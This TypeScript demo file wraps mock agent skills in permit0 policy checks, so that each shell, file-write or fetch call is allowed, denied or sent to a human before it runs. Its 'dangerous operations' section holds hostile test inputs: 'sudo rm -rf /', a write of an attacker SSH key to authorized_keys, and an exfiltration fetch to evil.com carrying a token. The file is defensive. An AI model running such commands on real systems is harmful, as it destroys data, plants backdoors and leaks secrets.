/**
 * OpenClaw + permit0 — Governed Skills Demo
 *
 * Shows how to wrap OpenClaw-style TypeScript "skills" with a permit0
 * policy check, so every skill invocation is adjudicated by the local
 * permit0 daemon before any side-effectful work runs.
 *
 * Run with:
 *   npm install
 *   npm start
 *
 * Requires permit0 HTTP server running at http://localhost:9090:
 *   cargo run -p permit0-cli -- serve --port 9090
 */

// ---------- ANSI colors ----------

const C = {
  reset: "\x1b[0m",
  dim: "\x1b[2m",
  bold: "\x1b[1m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  cyan: "\x1b[36m",
  gray: "\x1b[90m",
} as const;

// ---------- permit0 types ----------

export type Permission = "allow" | "deny" | "human" | string;

export interface Decision {
  permission: Permission;
  action_type?: string;
  channel?: string;
  norm_hash?: string;
  score?: number;
  tier?: string;
  blocked?: boolean;
  source?: string;
  block_reason?: string;
  [k: string]: unknown;
}

// ---------- Permit0Client ----------

export class Permit0Client {
  constructor(private readonly baseUrl: string = "http://localhost:9090") {}

  async check(
    toolName: string,
    parameters: Record<string, unknown>,
  ): Promise<Decision> {
    const res = await fetch(`${this.baseUrl}/api/v1/check`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ tool_name: toolName, parameters }),
    });
    if (!res.ok) {
      const body = await res.text().catch(() => "");
      throw new Error(
        `permit0 check failed: HTTP ${res.status} ${res.statusText} — ${body}`,
      );
    }
    return (await res.json()) as Decision;
  }

  async health(): Promise<boolean> {
    try {
      // The check endpoint itself is a good liveness probe — a trivial
      // tool_name round-trips cheaply.
      const res = await fetch(`${this.baseUrl}/api/v1/check`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ tool_name: "Ping", parameters: {} }),
      });
      return res.ok;
    } catch {
      return false;
    }
  }
}

// ---------- Skill wrapper ----------

export interface Blocked {
  blocked: true;
  reason: string;
  decision: Decision;
}

/**
 * Wrap an OpenClaw-style skill function so that every invocation first
 * consults permit0. On `deny` or `human`, the skill short-circuits with
 * a structured `Blocked` result instead of executing.
 */
export function permit0Skill<Args extends Record<string, unknown>, Result>(
  toolName: string,
  client: Permit0Client,
  skill: (args: Args) => Promise<Result>,
): (args: Args) => Promise<Result | Blocked> {
  return async (args: Args): Promise<Result | Blocked> => {
    const decision = await client.check(toolName, args);
    if (decision.permission === "deny") {
      return {
        blocked: true,
        reason: decision.block_reason ?? "policy block",
        decision,
      };
    }
    if (decision.permission === "human") {
      return {
        blocked: true,
        reason: "human approval required",
        decision,
      };
    }
    return skill(args);
  };
}

// ---------- Example skills (mock) ----------

const rawShell = async ({ command }: { command: string }): Promise<string> =>
  `[executed] ${command}`;

const rawWrite = async ({
  path,
  content,
}: {
  path: string;
  content: string;
}): Promise<string> => `[wrote ${content.length}B] ${path}`;

const rawFetch = async ({ url }: { url: string }): Promise<string> =>
  `[fetched] ${url}`;

// ---------- Pretty printing ----------

function permColor(perm: Permission): string {
  if (perm === "allow") return C.green;
  if (perm === "deny") return C.red;
  if (perm === "human") return C.yellow;
  return C.magenta;
}

function printHeader(title: string): void {
  console.log(`\n${C.bold}${C.cyan}── ${title} ${"─".repeat(Math.max(0, 60 - title.length))}${C.reset}`);
}

function printScenario(
  label: string,
  tool: string,
  args: Record<string, unknown>,
  result: unknown,
): void {
  const isBlocked =
    result && typeof result === "object" && (result as Blocked).blocked === true;
  const blocked = isBlocked ? (result as Blocked) : null;
  const decision = blocked?.decision;
  const perm = decision?.permission ?? "allow";
  const col = permColor(perm);

  console.log(
    `${C.bold}${label}${C.reset} ${C.gray}${tool}(${JSON.stringify(args)})${C.reset}`,
  );
  if (blocked && decision) {
    console.log(
      `  ${col}${perm.toUpperCase()}${C.reset} ` +
        `${C.dim}tier=${decision.tier ?? "?"} score=${decision.score ?? "?"} ` +
        `action=${decision.action_type ?? "?"}${C.reset}`,
    );
    console.log(`  ${C.red}blocked:${C.reset} ${blocked.reason}`);
  } else {
    console.log(
      `  ${col}ALLOW${C.reset} ${C.dim}→${C.reset} ${String(result)}`,
    );
  }
}

// ---------- Main ----------

async function main(): Promise<void> {
  const baseUrl = process.env.PERMIT0_URL ?? "http://localhost:9090";
  const client = new Permit0Client(baseUrl);

  console.log(
    `${C.bold}${C.blue}OpenClaw + permit0${C.reset} ${C.dim}governed skills demo${C.reset}`,
  );
  console.log(`${C.dim}permit0 endpoint: ${baseUrl}${C.reset}`);

  const alive = await client.health();
  if (!alive) {
    console.error(
      `\n${C.red}${C.bold}error:${C.reset} cannot reach permit0 at ${baseUrl}`,
    );
    console.error(
      `${C.dim}start the server with:${C.reset} cargo run -p permit0-cli -- serve --port 9090`,
    );
    process.exitCode = 1;
    return;
  }

  const safeShell = permit0Skill("Bash", client, rawShell);
  const safeWrite = permit0Skill("Write", client, rawWrite);
  const safeFetch = permit0Skill("WebFetch", client, rawFetch);

  printHeader("benign operations");
  {
    const args = { command: "ls -la" };
    printScenario("listing a directory", "Bash", args, await safeShell(args));
  }
  {
    const args = { path: "/tmp/notes.md", content: "hi" };
    printScenario("writing a scratch note", "Write", args, await safeWrite(args));
  }

  printHeader("dangerous operations");
  {
    const args = { command: "sudo rm -rf /" };
    printScenario("destructive rm", "Bash", args, await safeShell(args));
  }
  {
    const args = {
      path: "/root/.ssh/authorized_keys",
      content: "ssh-rsa AAAA... attacker",
    };
    printScenario("ssh key tamper", "Write", args, await safeWrite(args));
  }
  {
    const args = { url: "http://evil.com/exfil?token=secret" };
    printScenario("suspicious exfil fetch", "WebFetch", args, await safeFetch(args));
  }

  console.log(
    `\n${C.dim}done. wrap any OpenClaw skill with ${C.reset}${C.bold}permit0Skill(){}${C.reset}${C.dim} to gate it.${C.reset}`,
  );
}

main().catch((err) => {
  console.error(`${C.red}fatal:${C.reset}`, err);
  process.exitCode = 1;
});
